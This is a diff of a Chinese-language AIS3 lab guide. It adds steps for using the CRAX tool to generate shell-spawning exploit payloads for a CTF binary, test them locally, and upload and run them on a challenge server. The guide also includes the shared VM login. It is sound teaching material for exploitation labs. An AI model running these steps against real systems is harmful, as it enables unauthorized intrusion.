@@ -42,7 +42,6 @@ host & guest 的帳密皆為 `ais3 / crax`
 [sample2.c](http://123.tw) 與 sample.c 基本上一模一樣, 除了少 `s2e_make_concolic` 那一行  
 本實驗將透過 symbolic wrapper 對受測程式做 symbolic  
 
-
 1. 開啟 vm (host) 後, 在 `~/crax/script/result` 底下啟動 **CRAX**  
  - `crax.sh crax.s2e demo` (host)
 2. 啟動後會用 qemu 開啟一個 debian 的 vm (guest), 在 `~/sample/` 底下執行跑 `run2.sh`, 與 **lab 1-1** 的差別是, 這次透過 `~/wrapper` 底下的 `symarg` make symbolic 間接執行程式   
@@ -57,4 +56,28 @@ host & guest 的帳密皆為 `ais3 / crax`
 5. 測試 payload 是不是能成功拿到 shell  
  - `sample/sample2 $(cat sample2.exp)` (guest)
 
+## lab 1-3
+*lab 1-3* 將使用 **CRAX** 測試 AIS3 Day 2 的練習題 **easy pwn**  
+[stage2](http://123.tw) 是 **Defcon quals circa 2004** 的題目  
+本實驗將使用 **CRAX** 自動生出 **easy pwn** 的 payload  
+
+1. 開啟 vm (host) 後, 在 `~/crax/script/result` 底下啟動 **CRAX**  
+ - `crax.sh crax.s2e demo` (host)
+2. 啟動後會用 qemu 開啟一個 debian 的 vm (guest), 在 `~/easy_pwn/` 底下執行跑 `run.sh`  
+ - `cd easy_pwn && ./run.sh` (guest)
+3. host 上的 **CRAX** 會開始生 exploit, exploit 會在 `~/crax/script/result/s2e-last` 底下  
+ - exploit 可能會不只一個, address 較低的 exploit 比較容易成功  
+ - `cd s2e-last && ls exploit*` (host)
+ - _exploit-bfffede4.bin  exploit-bffffde5.bin_
+4. 再次啟動 **CRAX**, 透過 s2eget 指令取得 exploit  
+ - `crax.sh crax.s2e demo` (host)
+ - `cp exploit-xxxxxxxx ~/crax/share/stage2.exp` (host)
+ - `s2eget stage2.exp` (guest)
+5. 測試 payload 是不是能成功拿到 shell  
+ - `easy_pwn/stage2 $(cat stage2.exp)` (guest)
+6. 將 payload 上傳到題目環境
+ - `scp exploit-xxxxxxxx ctf@52.27.26.147:/tmp/your_dir/stage2.exp` (host)
+7. 在題目環境測試 payload 是否成功  
+ - `ssh ctf@52.27.26.147`
+ - `/home/stage2/stage2 $(cat /tmp/your_dir/stage2.exp)`
 
